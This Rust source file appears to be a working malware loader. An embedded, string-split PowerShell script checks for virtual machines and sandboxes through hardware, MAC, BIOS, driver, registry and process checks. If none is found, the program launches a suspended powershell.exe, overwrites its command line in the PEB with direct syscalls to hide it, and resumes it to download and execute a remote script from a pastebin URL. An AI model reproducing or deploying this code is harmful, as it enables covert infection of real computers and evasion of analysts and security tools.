#![allow(non_snake_case)]
mod obf;
mod syscalls;
use crate::syscalls::SYSCALLS;
use std::mem::{size_of, zeroed};
use std::ptr::null_mut;

use std::ffi::c_void;
use windows_sys::Win32::System::Threading::{
    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW, PEB, PROCESS_BASIC_INFORMATION,
    PROCESS_INFORMATION_CLASS, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
};
use std::process::Command;
use windows_sys::Win32::Foundation::{UNICODE_STRING, NTSTATUS};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;


fn to_wide_chars(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}

fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide = to_wide_chars(s);
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}

fn main() {
    const ANTI_VM_SCRIPT: &str = r#"
function a {
    try {
        $b = Get-WmiObject -Query ("SE" + "LECT * FROM Win32_Processor")
        $c = $b.HypervisorPresent
        return $c
    } catch {
        return $false
    }
}

function b {
    try {
        $c = Get-WmiObject -Class ("Win32_Computer" + "System")
        $d = [Math]::Round($c.TotalPhysicalMemory / 1GB)
        $e = @(1, 2, 4)
        return $e -contains $d
    } catch {
        return $false
    }
}

function c {
    try {
        $d = (Get-WmiObject -Class ("Win32_NetworkAdapter" + "Configuration") | Where-Object { $_.IPEnabled }).MACAddress
        $e = @("00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "00:1C:42", "52:54:00")
        foreach ($f in $d) {
            foreach ($g in $e) {
                if ($f -like "$g*") {
                    return $true
                }
            }
        }
        return $false
    } catch {
        return $false
    }
}

function d {
    try {
        $e = Get-WmiObject -Class ("Win32" + "_BIOS")
        $f = @("VMware", "VirtualBox", "QEMU", "Hyper-V", "Parallels", "Xen")
        foreach ($g in $f) {
            if (($e.SerialNumber -match $g) -or ($e.Manufacturer -match $g)) {
                return $true
            }
        }
        return $false
    } catch {
        return $false
    }
}

function e {
    try {
        $f = Get-WmiObject -Class ("Win32_Pro" + "cessor")
        $g = $f.NumberOfCores
        return $g -le 2
    } catch {
        return $false
    }
}

function f {
    try {
        $g = Get-WmiObject -Class ("Win32_Logical" + "Disk") | Where-Object { $_.DeviceID -eq "C:" }
        $h = [Math]::Round($g.Size / 1GB)
        $i = @(60, 80, 100)
        return $i -contains $h
    } catch {
        return $false
    }
}

function g {
    try {
        $h = Get-WmiObject -Class ("Win32_Video" + "Controller")
        $i = @("VMware SVGA", "VirtualBox Graphics Adapter", "Hyper-V Video", "QEMU Standard VGA", "Parallels Display Adapter")
        foreach ($j in $h) {
            foreach ($k in $i) {
                if ($j.Name -match $k) {
                    return $true
                }
            }
        }
        return $false
    } catch {
        return $false
    }
}

function h {
    try {
        $i = Get-WmiObject -Class ("Win32_PnPE" + "ntity")
        $j = @("VMware VMCI", "VirtualBox Guest Service", "Red Hat VirtIO")
        foreach ($k in $i) {
            foreach ($l in $j) {
                if ($k.Name -match $l) {
                    return $true
                }
            }
        }
        return $false
    } catch {
        return $false
    }
}

function i {
    try {
        $j = Get-WmiObject -Class ("Win32_System" + "Driver")
        $k = @("virtio", "vmxnet", "pvscsi", "vboxguest", "vmware", "vmusb", "vmx86")
        foreach ($l in $j) {
            foreach ($m in $k) {
                if ($l.Name -match $m) {
                    return $true
                }
            }
        }
        return $false
    } catch {
        return $false
    }
}

function j {
    $k = @(
        ("HKLM:\\SOFT" + "WARE\\VMware, Inc.\\VMware Tools"),
        ("HKLM:\\SYSTEM\\Current" + "ControlSet\\Services\\VBoxGuest"),
        ("HKLM:\\SYSTEM\\Current" + "ControlSet\\Services\\VBoxMouse"),
        ("HKLM:\\SYSTEM\\Current" + "ControlSet\\Services\\VBoxSF"),
        ("HKLM:\\SYSTEM\\Current" + "ControlSet\\Services\\VBoxVideo")
    )
    foreach ($l in $k) {
        if (Test-Path $l) {
            return $true
        }
    }
    return $false
}

function k {
    $l = @(
        "vmtoolsd",
        "VMwareService",
        "VMwareTray",
        "VBoxService",
        "VBoxTray",
        "qemu-ga",
        "prl_tools_service"
    )
    $m = Get-Process
    foreach ($n in $m) {
        foreach ($o in $l) {
            if ($n.ProcessName -eq $o) {
                return $true
            }
        }
    }
    return $false
}

function l {
    $m = @(
        ("C:\\Program Files\\" + "VMware"),
        ("C:\\Program Files\\" + "Oracle"),
        ("C:\\Program Files\\" + "VirtualBox"),
        ("C:\\Program Files\\" + "Parallels"),
        ("C:\\Program Files\\" + "QEMU")
    )
    foreach ($n in $m) {
        if (Test-Path $n) {
            return $true
        }
    }
    return $false
}

function m {
    try {
        $n = Get-WmiObject -Class ("Win32_Video" + "Controller")
        return $n.Name -eq ("VMware SVGA " + "II")
    } catch {
        return $false
    }
}

function n {
    try {
        $o = Get-WmiObject -Class ("Win32_SCSI" + "Controller")
        return $o.Name -eq ("Red Hat VirtIO SCSI " + "Controller")
    } catch {
        return $false
    }
}

function o {
    if (a) { return $true }
    if (b) { return $true }
    if (c) { return $true }
    if (d) { return $true }
    if (e) { return $true }
    if (f) { return $true }
    if (g) { return $true }
    if (h) { return $true }
    if (i) { return $true }
    if (j) { return $true }
    if (k) { return $true }
    if (l) { return $true }
    if (m) { return $true }
    if (n) { return $true }
    return $false
}

if (o) {
    Write-Output ("A virtual machine has " + "been detected.")
} else {
    Write-Output ("No virtual machine has " + "been detected.")
}

# Decoy code
$p = 1
while ($p -lt 10) {
    $p++
}
"#;

    let output = Command::new("powershell")
        .args(&["-Command", ANTI_VM_SCRIPT])
        .output()
        .expect("Failed to execute PowerShell script");

    if !String::from_utf8_lossy(&output.stdout).contains("No virtual machine has been detected.") {
        return;
    }

    let malicious_command = obf_str!("powershell.exe -ExecutionPolicy Bypass -Command \"IEX (Invoke-WebRequest -Uri 'https://pastebin.pl/view/raw/0ae25fc9' -UseBasicParsing).Content\"");
    let malicious_command_wide = to_wide_chars(&malicious_command);

    let spoofed_command_str = "powershell.exe";
    let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let mut current_dir = to_wide_chars("C:\\windows\\");
    current_dir.push(0);

    let success = unsafe {
        CreateProcessW(
            null_mut(),
            spoofed_command_wide.as_mut_ptr(),
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null_mut(),
            current_dir.as_ptr(),
            &mut si,
            &mut pi,
        )
    };
	
    if success == 0 {
        return;
    }
	
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let status: NTSTATUS =
        (SYSCALLS.NtQueryInformationProcess)(
            pi.hProcess as *mut c_void,
            0 as PROCESS_INFORMATION_CLASS,
            &mut pbi as *mut _ as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut peb: PEB = unsafe { zeroed() };
    let mut bytes_read: usize = 0;

    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            pbi.PebBaseAddress as *mut c_void,
            &mut peb as *mut _ as *mut c_void,
            size_of::<PEB>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<PEB>() {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    #[repr(C)]
    struct Params {
        _filler: [u8; 0x70],
        CommandLine: UNICODE_STRING,
    }
    let mut proc_params: Params = unsafe { zeroed() };
    let status = unsafe {
        (SYSCALLS.NtReadVirtualMemory)(
            pi.hProcess as *mut c_void,
            peb.ProcessParameters as *mut c_void,
            &mut proc_params as *mut _ as *mut c_void,
            size_of::<Params>(),
            &mut bytes_read
        )
    };

    if status != 0 || bytes_read != size_of::<Params>() {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let mut bytes_written: usize = 0;
    let status = unsafe {
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            proc_params.CommandLine.Buffer as *mut c_void,
            malicious_command_wide.as_ptr() as *mut c_void,
            malicious_command_wide.len() * 2,
            &mut bytes_written
        )
    };

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;

    let status = unsafe {
        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
        (SYSCALLS.NtWriteVirtualMemory)(
            pi.hProcess as *mut c_void,
            len_address as *mut c_void,
            &cmd_line_len as *const _ as *mut c_void,
            size_of::<u16>(),
            &mut bytes_written
        )
    };

    if status != 0 {
        unsafe {
            let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
            let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
        }
        return;
    }

    unsafe {
        let mut suspend_count: u32 = 0;
        let _ = (SYSCALLS.NtResumeThread)(pi.hThread as *mut c_void, &mut suspend_count);
        let _ = (SYSCALLS.NtClose)(pi.hProcess as *mut c_void);
        let _ = (SYSCALLS.NtClose)(pi.hThread as *mut c_void);
    }
}
